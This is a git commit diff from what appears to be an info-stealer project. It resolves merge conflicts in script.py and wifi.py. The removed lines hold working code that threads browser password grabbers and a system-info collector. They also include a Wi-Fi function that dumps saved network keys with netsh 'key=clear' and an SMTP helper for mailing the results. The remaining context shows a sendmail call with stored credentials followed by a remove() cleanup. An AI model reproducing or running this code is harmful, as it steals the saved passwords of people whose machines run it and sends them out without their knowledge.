b2f52fb53bbbcc7b296153904c52b31daef31c5a
Satyavart <satyavarty591@gmail.com>
2021-06-16 16:01:22 +0530

    v1.4

--- script.py
+++ script.py
@@ -1,34 +1,3 @@
-<<<<<<< HEAD
-import firefox
-import chrome
-import system
-import wifi
-import time
-import threading
-import multiprocessing
-
-start_time = time.time()
-
-
-t1 = threading.Thread(target=chrome.password, name='t1')
-t2 = threading.Thread(target=firefox.password, name='t2')
-t3 = threading.Thread(target=wifi.password, name='t3')
-t4 = threading.Thread(target=system.info, name='t4')
-
-t1.start()
-t2.start()
-t3.start()
-t4.start()
-
-t1.join()
-t2.join()
-t3.join()
-t4.join()
-
-
-
-print("--- %s seconds ---" % (time.time() - start_time))
-=======
 import wifi
 import time
 import secret
@@ -61,4 +30,3 @@ sendmail(secret.email,secret.password)
 remove()
 
 print("--- %s seconds ---" % (time.time() - start_time))
->>>>>>> 2bb1d6831671b5c20be4b37b2262c7ca51cd61a1
--- wifi.py
+++ wifi.py
@@ -1,43 +1,3 @@
-<<<<<<< HEAD
-import smtplib
-import subprocess
-import re
-
-def send_mails(email, password, message):
-    server = smtplib.SMTP("smtp.gmail.com", 587)
-    server.starttls()
-    server.login(email, password)
-    server.sendmail(email, email, message)
-    server.quit()
-
-
-def password():
-    data_network = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'])
-    networks = re.findall("(?:Profile\s*:\s)(.*?\\r)",data_network.decode())
-    mess = "WiFi Password"
-    mess = mess + "------------------------------------------\n"
-    Wifi_name = "Network\t:\tPassword"
-    for i in networks:
-        i = i.replace("\r", "")
-        Wifi_name = i
-        output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles', i, "key=clear"])
-        output = output.decode()
-        Type_net = re.findall("(?:Type\s*:\s)(.*?\\r)", output)[0]
-        password = ""
-        pas = re.findall("(?:Key\sContent\s*:\s)(.*?\\r)", output)
-        if pas:
-            password = pas[0]
-        mess = mess + Wifi_name + " ::::: " + password + "\n"
-    #print(mess)
-    with open('Wifi_pass.txt','w') as f:
-        f.write(mess)
-        f.close()
-    #send_mails(Email, Pass, mess)
-
-
-Email = "email_ID@gmail.com"
-Pass = "Password"
-=======
 import subprocess
 import re
 from savloc import temp
@@ -71,5 +31,4 @@ def password():
     #send_mails(Email, Pass, mess)
 
 
->>>>>>> 2bb1d6831671b5c20be4b37b2262c7ca51cd61a1
 password()
